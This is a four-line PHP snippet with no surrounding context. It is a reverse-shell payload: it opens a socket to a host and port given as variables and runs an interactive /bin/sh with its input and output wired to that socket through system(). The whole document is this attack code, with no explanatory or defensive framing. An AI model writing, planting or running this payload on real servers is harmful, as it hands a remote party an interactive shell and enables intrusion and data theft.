<?php
$socket = fsockopen($host, $port);
$command = '/bin/sh -i <&3 >&3 2>&3';
system($command);
